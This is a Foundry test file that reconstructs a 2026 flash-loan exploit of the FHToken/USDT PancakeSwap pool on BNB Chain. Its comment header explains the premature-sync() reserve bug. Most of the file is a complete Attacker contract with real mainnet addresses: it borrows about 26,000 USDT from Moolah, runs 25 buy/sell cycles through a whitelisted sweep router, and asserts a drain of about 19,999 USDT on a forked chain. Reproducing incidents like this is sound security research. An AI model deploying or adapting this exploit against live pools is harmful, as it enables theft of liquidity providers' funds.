// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// FHToken (Falcon Heavy Token, "FH") — sell-tax reserve mismatch via premature sync() — BNB Chain,
// 2026-08-23. Attacker nets ~19,999.02 USDT funded by a fee-free flash loan.
//
// Exploit tx : 0x7a3cadc2f33e000b0091307df62db2f5cc79ab8e0b022fd84de9e1c2c0745bd2 (block 117979402)
//
// ROOT CAUSE (verified against the verified FHToken source, the on-chain tx, and the arithmetic):
// FHToken._transfer treats a transfer whose recipient is the FH/USDT pair as a "sell". On a sell it
// does NOT tax the seller's own amount into the pool; instead it burns 80% and moves 20% of the
// net amount out of the POOL's OWN FH balance, then calls pair.sync() BEFORE crediting the seller's
// net FH to the pair:
//
//     } else if (isSell) {
//         feeAmount = (amount * sellFee) / FEE_DENOMINATOR;
//         uint256 netAmount = amount - feeAmount;
//         if (!inSwap) {
//             inSwap = true;
//             if (feeAmount > 0) super._transfer(sender, SLIPPAGE_WALLET, feeAmount);
//             if (netAmount > 0 && totalSupply() > targetSupply) {
//                 uint256 burnAmount = (netAmount * 80) / 100;
//                 uint256 treasuryAmount = netAmount - burnAmount;
//                 if (burnAmount > 0) { _burn(pair, burnAmount); ... }           // burns pool FH
//                 if (treasuryAmount > 0) super._transfer(pair, TREASURY_WALLET, treasuryAmount);
//                 try IUniswapV2Pair(pair).sync() {} catch {}                     // sync BEFORE credit
//             }
//             super._transfer(sender, recipient, netAmount);                      // seller's FH credited AFTER
//             inSwap = false;
//         } ...
//     }
//
// sync() latches reserve1 (FH) to the pair's balance after the burn/treasury removal but before the
// incoming sell is credited, so reserve1 is far below the pair's true post-transfer FH balance.
// PancakeSwap's getAmountOut then values the sell against the shrunken FH reserve and overpays USDT.
// The sell path is triggered automatically inside FHToken._transfer for any transfer into the pair,
// with no owner/admin/signer gate (only tradingEnabled and a blacklist check). The buy path IS gated
// (recipient must be in isBuyerWhitelist), so the attacker routes the buy leg's output through a
// hardcoded-whitelisted SwapRouter (0x1b81D678, whitelisted in FHToken's constructor) and then pulls
// the FH back with that router's public sweepToken(). Amplification: each buy first inflates the
// pool's USDT side, so the following sell's overpay compounds; looping 25 buy/sell cycles drains it.
//
// This is a reconstruction, not a replay. The attacker's on-chain contracts (0x727Fb666..., its
// flash-loan wrapper) are never used. A fresh Attacker contract below takes a real fee-free flash
// loan from the actual Lista/Moolah pool (typed onMoolahFlashLoan callback) and runs the cycles with
// typed calls to the real PancakeSwap V2 router and the real 0x1b81D678 router. Only the per-cycle
// USDT buy sizes are taken from the original tx, so the pool follows the same trajectory; every swap
// is executed by the real contracts on the fork.
//
// Moolah's flash loan uses transient storage, so this must run with cancun:
//   forge test --contracts src/test/2026-08/FHToken_exp.sol --evm-version cancun -vvv

interface IMoolah {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

interface IMoolahFlashLoanCallback {
    function onMoolahFlashLoan(uint256 assets, bytes calldata data) external;
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface ISweepRouter {
    function sweepToken(address token, uint256 amountMinimum, address recipient) external payable;
}

contract Attacker is IMoolahFlashLoanCallback {
    IMoolah internal constant MOOLAH = IMoolah(0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C);
    IPancakeRouter internal constant ROUTER = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    ISweepRouter internal constant SWEEP_ROUTER = ISweepRouter(0x1b81D678ffb9C0263b24A97847620C99d213eB14);
    IERC20 internal constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 internal constant FH = IERC20(0xdCf0DFe0053677A67610c6d08EA1f5c78DF8cA37);
    address internal constant PAIR = 0x8f2d1A3992856a860304f1B86534B6B129Cc4df7;

    uint256 internal constant LOAN = 25_999_350_000_000_000_000_000; // 25,999.35 USDT, matching on-chain

    function run() external {
        MOOLAH.flashLoan(address(USDT), LOAN, "");
    }

    function onMoolahFlashLoan(uint256 assets, bytes calldata) external override {
        require(msg.sender == address(MOOLAH), "only moolah");

        USDT.approve(address(ROUTER), type(uint256).max);
        FH.approve(address(ROUTER), type(uint256).max);

        uint256[25] memory b = _buys();
        for (uint256 i = 0; i < b.length; i++) {
            _buy(b[i]);
            _sellAll();
        }

        // Repay the (fee-free) flash loan; Moolah pulls it via transferFrom after this returns.
        USDT.approve(address(MOOLAH), assets);
    }

    function _buy(
        uint256 usdtIn
    ) internal {
        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(FH);
        // Output goes to the whitelisted SwapRouter (buy path is whitelist-gated on the recipient),
        // then its public sweepToken() forwards the FH to this contract.
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(usdtIn, 0, path, address(SWEEP_ROUTER), block.timestamp);
        SWEEP_ROUTER.sweepToken(address(FH), 0, address(this));
    }

    function _sellAll() internal {
        uint256 bal = FH.balanceOf(address(this));
        if (bal == 0) return;
        address[] memory path = new address[](2);
        path[0] = address(FH);
        path[1] = address(USDT);
        // Selling into the pair triggers the premature-sync bug; the router reads the shrunken
        // reserves and pays out the inflated USDT amount.
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(bal, 0, path, address(this), block.timestamp);
    }

    function _buys() internal pure returns (uint256[25] memory b) {
            b[0] = 19799505000000000000000;
            b[1] = 4294771867419896586556;
            b[2] = 2938836021986925319656;
            b[3] = 2010993233341752866287;
            b[4] = 1376086911379334382111;
            b[5] = 941631804758892845619;
            b[6] = 644341900501565528230;
            b[7] = 440911705237352658988;
            b[8] = 301708039883769476703;
            b[9] = 206453446912923209167;
            b[10] = 141272422699267044335;
            b[11] = 96670206837176779256;
            b[12] = 66149703610845097504;
            b[13] = 45265065949148704688;
            b[14] = 30974079754529158785;
            b[15] = 21195012014733987754;
            b[16] = 14503369845524790118;
            b[17] = 9924398095639286004;
            b[18] = 6791089147541820113;
            b[19] = 4647021548855906642;
            b[20] = 3179874215514878363;
            b[21] = 2175931383185823934;
            b[22] = 1488951154492865499;
            b[23] = 1018862799441643929;
            b[24] = 697189696890783854;
    }
}

contract FHToken_exp is BaseTestWithBalanceLog {
    IERC20 internal constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    Attacker internal atk;

    uint256 internal constant FORK_BLOCK = 117_979_401; // parent of exploit block 117979402
    uint256 internal constant EXPECTED_PROFIT = 19_999_020_000_000_000_000_000; // ~19,999.02 USDT

    function setUp() public {
        vm.createSelectFork("https://bsc-mainnet.public.blastapi.io", FORK_BLOCK);
        atk = new Attacker();
        fundingToken = address(USDT);
        attacker = address(atk);
        vm.label(address(atk), "Attacker");
        vm.label(0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C, "MoolahFlashPool");
        vm.label(0x10ED43C718714eb63d5aA57B78B54704E256024E, "PancakeRouterV2");
        vm.label(0x1b81D678ffb9C0263b24A97847620C99d213eB14, "WhitelistedSwapRouter");
        vm.label(0x8f2d1A3992856a860304f1B86534B6B129Cc4df7, "FH_USDT_Pair");
        vm.label(0xdCf0DFe0053677A67610c6d08EA1f5c78DF8cA37, "FHToken");
    }

    function testExploit() public balanceLog {
        assertEq(USDT.balanceOf(address(atk)), 0, "attacker already funded");

        atk.run();

        uint256 profit = USDT.balanceOf(address(atk));
        emit log_named_decimal_uint("attacker net USDT profit", profit, 18);

        // Matches the reported ~19,999.02 USDT drain. Same fork block and same per-cycle buy sizes,
        // so the pool trajectory and the resulting sells reproduce the on-chain figure.
        assertApproxEqRel(profit, EXPECTED_PROFIT, 1e16, "profit off reported ~19,999.02 USDT");
    }
}
